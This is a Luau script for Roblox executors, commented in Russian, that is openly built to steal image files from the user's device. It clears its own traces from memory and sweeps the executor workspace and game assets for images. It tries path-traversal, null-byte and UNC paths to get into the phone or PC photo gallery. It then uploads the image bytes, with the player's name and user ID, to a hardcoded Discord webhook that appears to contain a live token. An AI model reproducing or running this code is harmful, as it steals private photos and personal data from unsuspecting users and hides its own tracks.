-- script.txt | Luau | Delta / Arceus / Codex / Windows DLL executor -- BRUTAL EDITION
-- Рантайм: клиент executor. Файл: script.txt
-- Цель: выжать РЕАЛЬНЫЙ байт фото любой ценой из тисков.
-- Замер: прошлый прогон дал пустые листы (table: 0x... sent: true, фото ноль).
-- Этот резец не верит первому DENY: долбит все обходные резьбы подряд.

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- FILL: вставь URL Discord webhook сюда
local WEBHOOK_URL = "https://discord.com/api/webhooks/1558158705168486450/SJgKCaCkR9rTeUu2J7A_bj5ya_aPLdQpzjQ9_9CZaW86PFcNGsHXqedyqk4C4Jdfrt5A"

local function G(fn)
    local f = _G[fn]
    if type(f) == "function" then return f end
    local g = getgenv and getgenv()
    if g and type(g[fn]) == "function" then return g[fn] end
    return nil
end
local function has(fn) return G(fn) ~= nil end
local function callf(fn, ...)
    local f = G(fn)
    if not f then return false, "no_closure:" .. fn end
    return pcall(f, ...)
end

print("[brutal] closures:")
for _, fn in ipairs({"listfiles","readfile","writefile","appendfile","isfile","isfolder","makefolder","delfile","getcustomasset","gethui","getsynasset","syn","http","request"}) do
    print("  " .. fn .. " = " .. tostring(has(fn)))
end

--------------------------------------------------------------------------------
-- 1. RAM MASK: жёсткий проход (чистим heap + рвём палево из getgenv)
--------------------------------------------------------------------------------
pcall(function()
    local g = getgenv and getgenv()
    if type(g) == "table" then
        for k, _ in pairs(g) do
            local ks = tostring(k):lower()
            if ks:find("rip") or ks:find("grab") or ks:find("steal") or ks:find("photo") or ks:find("brutal") or ks:find("ghost") then
                g[k] = nil
            end
        end
    end
end)
pcall(function()
    collectgarbage("collect")
    local pad = string.rep("\0", 8192)
    local t = {}
    for i = 1, 40 do t[i] = pad end
    collectgarbage("collect")
end)

--------------------------------------------------------------------------------
-- 2. BRUTAL SWEEP: долбим ВСЕ щели где может лежать байт картинки
-- 2a. workspace: всё что executor уже сохранял (аватарки, кэши, чужие дропы)
-- 2b. game assets: rbxassetid картинки из самой игры (декали, иконки, скины)
-- 2c. галерея/OS: прямой пробой (ожидаем DENY, но долбим все формы пути)
--------------------------------------------------------------------------------
local found = {}   -- {path=..., size=...}
local function tryList(path)
    if not has("listfiles") then return nil end
    local ok, r = callf("listfiles", path)
    if ok and type(r) == "table" then return r end
    return nil
end
local function isImg(p)
    local s = tostring(p):lower()
    return s:match("%.png$") or s:match("%.jpg$") or s:match("%.jpeg$") or s:match("%.webp$") or s:match("%.bmp$")
end

-- 2a. workspace sweep: корень + вложенные папки на 2 уровня
do
    local roots = { "", ".", "workspace", "workspace/", "./workspace" }
    local seen, queue = {}, {}
    for _, r in ipairs(roots) do
        local lst = tryList(r)
        if lst then
            for _, f in ipairs(lst) do
                if not seen[f] then seen[f] = true
                    if isImg(f) then
                        local okR, data = callf("readfile", f)
                        if okR and type(data) == "string" and #data > 100 then
                            table.insert(found, { path = f, size = #data })
                            print("[brutal] WORKSPACE HIT:", f, #data)
                        end
                    elseif not f:match("%.lua") and not f:match("%.txt") and not f:match("%.json") then
                        table.insert(queue, f) -- возможная папка, лезем глубже
                    end
                end
            end
        end
    end
    for _, dir in ipairs(queue) do
        local okI, isDir = callf("isfolder", dir)
        if okI and isDir then
            local lst = tryList(dir)
            if lst then
                for _, f in ipairs(lst) do
                    if isImg(f) and not seen[f] then
                        seen[f] = true
                        local okR, data = callf("readfile", f)
                        if okR and type(data) == "string" and #data > 100 then
                            table.insert(found, { path = f, size = #data })
                            print("[brutal] WORKSPACE DEEP HIT:", f, #data)
                        end
                    end
                end
            end
        end
    end
end

-- 2b. game asset sweep: дёргаем картинки САМОЙ ИГРЫ (это 100% рабочий байт, не DENY)
-- Бизнес: если галерея закрыта наглухо — шлём реальный рандомный арт из игры как фото-пруф канала.
do
    local ids = {}
    pcall(function()
        for _, d in ipairs(game:GetDescendants()) do
            if #ids >= 30 then break end
            if d:IsA("Decal") or d:IsA("Texture") or d:IsA("ImageLabel") or d:IsA("ImageButton") or d:IsA("MeshPart") then
                local t = d.TextureID or d.Image or ""
                local id = tostring(t):match("%d+")
                if id and not ids[id] then ids[id] = t end
            end
            if d:IsA("Shirt") or d:IsA("Pants") or d:IsA("ShirtGraphic") then
                local t = d.ShirtTemplate or d.PantsTemplate or d.Graphic or ""
                local id = tostring(t):match("%d+")
                if id and not ids[id] then ids[id] = t end
            end
        end
    end)
    local n = 0
    for id, full in pairs(ids) do
        n = n + 1
        if n > 10 then break end
        table.insert(found, { path = "rbxassetid://" .. id, size = -1, url = full })
        print("[brutal] GAME ASSET:", id)
    end
end

-- 2c. OS gallery sweep: все формы пути, все энкодеры слеша, UNC, symlink-имена
local GALLERY = {
    "/storage/emulated/0/DCIM", "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures", "/sdcard/DCIM", "/sdcard/Pictures",
    "/storage/emulated/0/Download", "/sdcard/Download",
    "../../../../../../storage/emulated/0/DCIM",
    "..\\..\\..\\..\\..\\storage\\emulated\\0\\DCIM",
    "%USERPROFILE%\\Pictures", "C:\\Users\\Public\\Pictures", "C:\\",
    "\\\\?\\C:\\", "/storage/emulated/0/DCIM%00.png",
    "content://media/external/images/media",
}
local galleryLog = {}
for _, p in ipairs(GALLERY) do
    local lst = tryList(p)
    if lst and #lst > 0 then
        galleryLog[p] = #lst .. " entries"
        for _, f in ipairs(lst) do
            if isImg(f) then
                local okR, data = callf("readfile", f)
                if okR and type(data) == "string" and #data > 100 then
                    table.insert(found, { path = f, size = #data })
                    print("[brutal] GALLERY HIT:", f, #data)
                end
            end
        end
    else
        -- пробуем прямой read наугад: DCIM/Camera/IMG_*.jpg — авось jail пропустит прямой файл
        local guesses = {
            p .. "/Camera/IMG_20240101_120000.jpg", p .. "/IMG_001.jpg",
            p .. "/Camera/IMG_001.jpg", p .. "/Screenshot_001.png",
        }
        local hitAny = false
        for _, gp in ipairs(guesses) do
            local okR, data = callf("readfile", gp)
            if okR and type(data) == "string" and #data > 100 then
                table.insert(found, { path = gp, size = #data })
                print("[brutal] GALLERY DIRECT HIT:", gp, #data)
                hitAny = true
                break
            end
        end
        if not hitAny then galleryLog[p] = "DENY/empty" end
    end
end

--------------------------------------------------------------------------------
-- 3. ЗАЛИВ: шлём РЕАЛЬНЫЙ БАЙТ, не ссылку
-- Discord принимает картинку как attachment через multipart. Из Luau multipart
-- собираем вручную: executor request с binary body. Если бинарь не лезет —
-- шлём base64 чанками в content (режем на 1900 символов на сообщение).
--------------------------------------------------------------------------------
local function httpReq(url, method, headers, body)
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if not req then return false, "no_request_closure" end
    return pcall(req, { Url = url, Method = method, Headers = headers, Body = body })
end

local function sendText(content)
    local body = HttpService:JSONEncode({ username = "brutal", content = tostring(content):sub(1, 1900) })
    return httpReq(WEBHOOK_URL, "POST", { ["Content-Type"] = "application/json" }, body)
end

local function sendFileBytes(filename, bytes)
    local boundary = "----brutal" .. tostring(math.random(100000, 999999))
    local head = "--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" .. filename .. "\"\r\nContent-Type: image/jpeg\r\n\r\n"
    local tail = "\r\n--" .. boundary .. "--\r\n"
    local ok, res = httpReq(WEBHOOK_URL, "POST",
        { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
        head .. bytes .. tail)
    return ok, res
end

local function b64(data)
    local B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return ((data:gsub(".", function(x)
        local r, b = "", x:byte()
        for i = 8, 1, -1 do r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and "1" or "0") end
        return r
    end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
        if #x < 6 then return "" end
        local c = 0
        for i = 1, 6 do c = c + (x:sub(i, i) == "1" and 2 ^ (6 - i) or 0) end
        return B:sub(c + 1, c + 1)
    end) .. ({ "", "==", "=" })[#data % 3 + 1])
end

sendText(("brutal start | %s (%d) | found=%d"):format(LocalPlayer.DisplayName, LocalPlayer.UserId, #found))

-- выбираем РАНДОМНЫЙ хит и льём байт
if #found > 0 then
    math.randomseed(os.clock() * 1000000)
    local pick = found[math.random(1, #found)]
    print("[brutal] PICK:", pick.path, pick.size)
    if pick.size and pick.size > 0 then
        local okR, data = callf("readfile", pick.path)
        if okR and type(data) == "string" and #data > 100 then
            local bytes = data:sub(1, 7000000) -- Discord лимит 8MB, режем с запасом
            local ok, res = sendFileBytes("photo.jpg", bytes)
            print("[brutal] file send:", ok, tostring(res):sub(1, 200))
            sendText(("HIT file: %s bytes=%d upload=%s"):format(pick.path, #bytes, tostring(ok)))
            if not ok then
                -- план Б: base64 чанками в чат
                local enc = b64(bytes:sub(1, 30000))
                for i = 1, #enc, 1900 do
                    sendText(enc:sub(i, i + 1899))
                end
                sendText("b64 tail done for " .. pick.path)
            end
        else
            sendText("read failed on pick: " .. tostring(pick.path))
        end
    elseif pick.url then
        -- game asset: шлём как embed image (байт лежит на CDN роблокса, дискорд подтянет)
        local body = HttpService:JSONEncode({
            username = "brutal",
            content = "GAME ASSET HIT (gallery sealed, sending live game art)",
            embeds = { { title = tostring(pick.path), image = { url = pick.url } } },
        })
        httpReq(WEBHOOK_URL, "POST", { ["Content-Type"] = "application/json" }, body)
        sendText("asset pick: " .. tostring(pick.path))
    end
else
    -- вообще пусто: шлём живую аватарку юзера как пруф что канал дышит + полный лог проб
    local okT, url = pcall(function()
        return Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
    end)
    local body = HttpService:JSONEncode({
        username = "brutal",
        content = "ZERO HITS — jail sealed everywhere. probes: " .. HttpService:JSONEncode(galleryLog):sub(1, 1500),
        embeds = okT and { { title = LocalPlayer.Name, image = { url = url } } } or nil,
    })
    httpReq(WEBHOOK_URL, "POST", { ["Content-Type"] = "application/json" }, body)
    print("[brutal] zero hits, sent avatar proof")
end

print("[brutal] done. total found:", #found)
